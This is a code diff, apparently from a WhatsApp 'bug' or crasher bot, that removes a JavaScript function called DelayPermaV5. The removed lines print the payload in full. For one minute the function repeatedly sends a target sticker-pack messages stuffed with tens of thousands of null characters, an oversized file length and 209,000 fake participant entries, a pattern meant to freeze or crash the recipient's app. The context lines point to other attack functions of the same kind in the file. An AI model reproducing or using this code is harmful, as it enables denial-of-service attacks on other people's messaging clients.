@@ -3666,48 +3666,7 @@ quantity: 99999
 }, { participant: { jid: target }});
 }
 
-async function DelayPermaV5(sock, target) {
-const Nadokk = "\u0000".repeat(900);
-// jangan di hapus nanti error 
-const Nandok = "999999999999";
-// jangan di hapus nanti error 
-const startTime = Date.now();
-const duration = 1 * 60 * 1000;
-while (Date.now() - startTime < duration) {
-const MakLo = {
-    groupStatusMessageV2: {
-      message: {
-        stickerPackMessage: {
-          stickerPackId: Nadokk,
-          name: Nadokk,
-          publisher: Nadokk,
-          fileLength: Nandok,
-          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-          mimetype: "image/webp",
-          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
 
-          contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
-          isForwarded: true,
-          forwardingScore: 9999,
-          urlTrackingMap: {
-            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
-              participant: 62${z + 899099}@s.whatsapp.net
-            }))
-          },
-         },
-        }
-      }
-    }
-  };
-
-  await sock.relayMessage(target, MakLo, {
-    participant: { jid: target }
-  });
-}
-}
 
 async function VnXDelayHardV2Sw(sock, target, mention = true) {
   const vnxfcnih = generateWAMessageFromContent(
